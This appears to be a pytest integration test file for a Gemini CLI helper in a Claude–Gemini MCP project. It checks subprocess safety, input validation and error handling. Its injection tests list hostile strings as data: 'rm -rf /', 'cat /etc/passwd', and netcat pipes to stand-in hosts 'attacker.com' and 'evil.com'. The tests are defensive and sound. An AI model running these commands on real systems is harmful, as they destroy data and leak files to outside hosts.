#!/usr/bin/env python3
"""
Integration tests for CLI fallback logic and command execution
Tests the security of subprocess execution and error handling
"""

import asyncio
import os
import sys
import time
from queue import Queue, Empty
from typing import Any, List
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

# Import our server components
sys.path.insert(
    0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
)

from claude_gemini_mcp.gemini_helper import execute_gemini_cli_streaming


class TestCLIFallbackSecurity:
    """Test CLI fallback security measures"""

    def _mock_streaming_thread(self, output="test output"):
        """Create a mock streaming function"""
        def mock_stream_thread(process, queue, stop_event):
            queue.put(("stdout", output))
            queue.put(("done", None))
        return mock_stream_thread

    def _mock_successful_process(self, output="test output"):
        """Create a mock process that simulates successful execution"""
        mock_process = MagicMock()
        mock_process.returncode = 0
        mock_process.pid = 12345
        mock_process.poll = MagicMock(return_value=0)  # Process completed
        mock_process.stderr = MagicMock()
        mock_process.stderr.read = MagicMock(return_value="")
        return mock_process

    @pytest.mark.asyncio
    async def test_no_shell_injection(self) -> None:
        """Test that shell injection is prevented in CLI execution"""

        # Test malicious prompts that could cause shell injection
        malicious_prompts = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | nc attacker.com 4444",
            "test $(whoami)",
            "test `id`",
            "test > /tmp/evil.sh",
        ]

        for malicious_prompt in malicious_prompts:
            mock_process = self._mock_successful_process("safe output")
            mock_stream_func = self._mock_streaming_thread("safe output")

            with patch("subprocess.Popen", return_value=mock_process) as mock_exec:
                with patch("claude_gemini_mcp.gemini_helper.stream_subprocess_output", side_effect=mock_stream_func):
                    with patch("claude_gemini_mcp.gemini_helper.get_api_key", return_value=None):
                        result = await execute_gemini_cli_streaming(
                            malicious_prompt, "gemini-2.5-flash"
                        )

                    # Verify that subprocess.Popen was called with individual args
                    # This ensures no shell interpretation of the malicious content
                    if mock_exec.call_args:  # Only check if subprocess was actually called
                        call_args = mock_exec.call_args[0]
                        assert call_args[0] == [
                            "gemini",
                            "-m",
                            "gemini-2.5-flash",
                            "-p",
                            malicious_prompt[:1000],  # CLI truncates prompt to 1000 chars
                        ]

                        # Verify no shell=True was used  # noqa: B602
                        kwargs = mock_exec.call_args[1]
                        assert "shell" not in kwargs or kwargs["shell"] is False

                    assert result["success"] is True

    @pytest.mark.asyncio
    async def test_command_argument_validation(self) -> None:
        """Test that command arguments are properly validated"""

        # Test with invalid model names that could be dangerous
        dangerous_models = [
            "../../../bin/sh",
            "; cat /etc/passwd #",
            "model && rm -rf /",
            "model | nc evil.com 443",
        ]

        for dangerous_model in dangerous_models:
            result = await execute_gemini_cli_streaming(
                "test", dangerous_model
            )

            assert result["success"] is False
            # Should fail with model name validation error
            assert "invalid model name" in result["error"].lower()

    @pytest.mark.asyncio
    async def test_environment_isolation(self) -> None:
        """Test that subprocess runs with minimal environment"""

        mock_process = self._mock_successful_process("test output")
        mock_stream_func = self._mock_streaming_thread("test output")

        with patch("subprocess.Popen", return_value=mock_process) as mock_exec:
            with patch("claude_gemini_mcp.gemini_helper.stream_subprocess_output", side_effect=mock_stream_func):
                with patch("claude_gemini_mcp.gemini_helper.get_api_key", return_value=None):
                    result = await execute_gemini_cli_streaming("test", "gemini-2.5-flash")

                # Verify minimal environment was passed
                if mock_exec.call_args:
                    kwargs = mock_exec.call_args[1]
                    env = kwargs.get("env", {})

                    # Should only have PATH, not full environment
                    assert "PATH" in env
                    # Sensitive variables should not be passed
                    assert "HOME" not in env
                    assert "USER" not in env

                assert result["success"] is True


class TestCLIProcessManagement:
    """Test CLI process lifecycle and management"""

    @pytest.mark.asyncio
    async def test_process_timeout_handling(self) -> Any:
        """Test that long-running processes are handled correctly"""

        mock_process = MagicMock()
        mock_process.pid = 12345
        mock_process.returncode = 0  # Process completed successfully
        # Mock poll to first return None (running), then 0 (completed)
        poll_calls = [None, 0]  # First call: still running, second call: completed
        mock_process.poll = MagicMock(side_effect=poll_calls)
        mock_process.stderr = MagicMock()
        mock_process.stderr.read = MagicMock(return_value="")

        # Mock streaming to simulate successful completion after delay
        def mock_delayed_stream(process, queue, stop_event):
            queue.put(("stdout", "delayed output"))
            queue.put(("done", None))

        with patch("subprocess.Popen", return_value=mock_process):
            with patch("claude_gemini_mcp.gemini_helper.stream_subprocess_output", side_effect=mock_delayed_stream):
                with patch("claude_gemini_mcp.gemini_helper.get_api_key", return_value=None):
                    # This should not hang indefinitely
                    result = await execute_gemini_cli_streaming(
                        "test", "gemini-2.5-flash"
                    )

                    # Should complete even with timeouts
                    assert result is not None
                    assert result["success"] is True

    @pytest.mark.asyncio
    async def test_process_memory_constraints(self) -> None:
        """Test handling of processes with large output"""

        # Create a very large output to test memory handling
        large_output = "\n".join([f"Line {i}: {'A' * 1000}" for i in range(1000)])

        mock_process = MagicMock()
        mock_process.returncode = 0
        mock_process.pid = 12345
        mock_process.poll = MagicMock(return_value=0)  # Process completed
        mock_process.stderr = MagicMock()
        mock_process.stderr.read = MagicMock(return_value="")

        # Mock streaming to simulate large output
        def mock_large_stream(process, queue, stop_event):
            queue.put(("stdout", large_output))
            queue.put(("done", None))

        with patch("subprocess.Popen", return_value=mock_process):
            with patch("claude_gemini_mcp.gemini_helper.stream_subprocess_output", side_effect=mock_large_stream):
                with patch("claude_gemini_mcp.gemini_helper.get_api_key", return_value=None):
                    result = await execute_gemini_cli_streaming(
                        "test", "gemini-2.5-flash"
                    )

                    assert result["success"] is True
                    # Verify we captured the large output
                    assert len(result["output"]) > 100000  # Should be > 100KB

    @pytest.mark.asyncio
    async def test_stderr_error_capture(self) -> None:
        """Test that stderr errors are properly captured and sanitized"""

        mock_process = MagicMock()
        mock_process.returncode = 1
        mock_process.pid = 12345
        mock_process.poll = MagicMock(return_value=1)  # Process failed

        # Simulate stderr with potential sensitive info
        stderr_with_sensitive = (
            "Error: API key AIzaSyBHJ5X2K9L8M3N4O5P6Q7R8S9T0 invalid"
        )
        mock_process.stderr = MagicMock()
        mock_process.stderr.read = MagicMock(return_value=stderr_with_sensitive)

        # Mock streaming to complete immediately
        def mock_error_stream(process, queue, stop_event):
            queue.put(("done", None))

        with patch("subprocess.Popen", return_value=mock_process):
            with patch("claude_gemini_mcp.gemini_helper.stream_subprocess_output", side_effect=mock_error_stream):
                with patch("claude_gemini_mcp.gemini_helper.get_api_key", return_value=None):
                    result = await execute_gemini_cli_streaming(
                        "test", "gemini-2.5-flash"
                    )

                    assert result["success"] is False
                    # For now, the CLI function returns raw stderr (this could be improved)
                    # The error should contain the stderr content
                    assert "API key" in result["error"]
                    # Note: CLI sanitization could be added as an enhancement

    @pytest.mark.asyncio
    async def test_concurrent_cli_executions(self) -> None:
        """Test that multiple CLI executions can run concurrently"""

        # Mock multiple processes
        processes = []
        for i in range(3):
            mock_process = MagicMock()
            mock_process.returncode = 0
            mock_process.pid = 12345 + i
            mock_process.poll = MagicMock(return_value=0)  # Process completed
            mock_process.stderr = MagicMock()
            mock_process.stderr.read = MagicMock(return_value="")
            processes.append(mock_process)

        # Mock streaming to simulate concurrent output
        def mock_concurrent_stream(process, queue, stop_event):
            output = f"Output {process.pid - 12345}"  # Extract index from pid
            queue.put(("stdout", output))
            queue.put(("done", None))

        with patch("subprocess.Popen", side_effect=processes):
            with patch("claude_gemini_mcp.gemini_helper.stream_subprocess_output", side_effect=mock_concurrent_stream):
                with patch("claude_gemini_mcp.gemini_helper.get_api_key", return_value=None):
                    # Run multiple CLI executions concurrently
                    tasks = [
                        execute_gemini_cli_streaming(f"test {i}", "gemini-2.5-flash")
                        for i in range(3)
                    ]

                    results = await asyncio.gather(*tasks)

                    # All should succeed
                    assert len(results) == 3
                    for i, result in enumerate(results):
                        assert result["success"] is True
                        assert f"Output {i}" in result["output"]


class TestCLIInputValidation:
    """Test CLI input validation and sanitization"""

    @pytest.mark.asyncio
    async def test_prompt_length_validation(self) -> None:
        """Test that overly long prompts are rejected"""

        # Test prompt that exceeds 1MB limit
        very_long_prompt = "A" * 1000001  # Just over 1MB

        result = await execute_gemini_cli_streaming(
            very_long_prompt, "gemini-2.5-flash"
        )

        assert result["success"] is False
        assert "too large" in result["error"]

    @pytest.mark.asyncio
    async def test_prompt_type_validation(self) -> None:
        """Test that non-string prompts are rejected"""

        invalid_prompts: List[Any] = [None, 123, [], {}, b"bytes"]

        for invalid_prompt in invalid_prompts:
            result = await execute_gemini_cli_streaming(
                invalid_prompt, "gemini-2.5-flash"
            )

            assert result["success"] is False
            assert "Invalid prompt" in result["error"]

    @pytest.mark.asyncio
    async def test_empty_prompt_handling(self) -> None:
        """Test handling of empty or whitespace-only prompts"""

        empty_prompts = ["", "   ", "\n\n\n", "\t\t"]

        for empty_prompt in empty_prompts:
            result = await execute_gemini_cli_streaming(
                empty_prompt, "gemini-2.5-flash"
            )

            assert result["success"] is False
            assert "Invalid prompt" in result["error"]


class TestCLIErrorRecovery:
    """Test CLI error recovery and resilience"""

    @pytest.mark.asyncio
    async def test_process_crash_handling(self) -> None:
        """Test handling when CLI process crashes unexpectedly"""

        mock_process = MagicMock()
        mock_process.returncode = -9  # SIGKILL
        mock_process.pid = 12345
        mock_process.poll = MagicMock(return_value=-9)  # Process killed
        mock_process.stderr = MagicMock()
        mock_process.stderr.read = MagicMock(return_value="Process killed")

        # Mock streaming to simulate process error
        def mock_error_stream(process, queue, stop_event):
            queue.put(("error", "Process killed"))

        with patch("subprocess.Popen", return_value=mock_process):
            with patch("claude_gemini_mcp.gemini_helper.stream_subprocess_output", side_effect=mock_error_stream):
                with patch("claude_gemini_mcp.gemini_helper.get_api_key", return_value=None):
                    result = await execute_gemini_cli_streaming(
                        "test", "gemini-2.5-flash"
                    )

                    assert result["success"] is False
                    assert "process killed" in result["error"].lower()

    @pytest.mark.asyncio
    async def test_subprocess_exception_handling(self) -> None:
        """Test handling of subprocess creation exceptions"""

        with patch(
            "subprocess.Popen", side_effect=OSError("Command not found")
        ):
            with patch("claude_gemini_mcp.gemini_helper.get_api_key", return_value=None):
                result = await execute_gemini_cli_streaming(
                    "test", "gemini-2.5-flash"
                )

                assert result["success"] is False
                assert "Command not found" in result["error"]


if __name__ == "__main__":
    # Run integration tests
    import subprocess
    import sys

    print("Running CLI Fallback Integration Tests...")
    result = subprocess.run(
        [sys.executable, "-m", "pytest", __file__, "-v", "--tb=short"],
        capture_output=True,
        text=True,
    )

    print(result.stdout)
    if result.stderr:
        print("STDERR:", result.stderr)

    sys.exit(result.returncode)
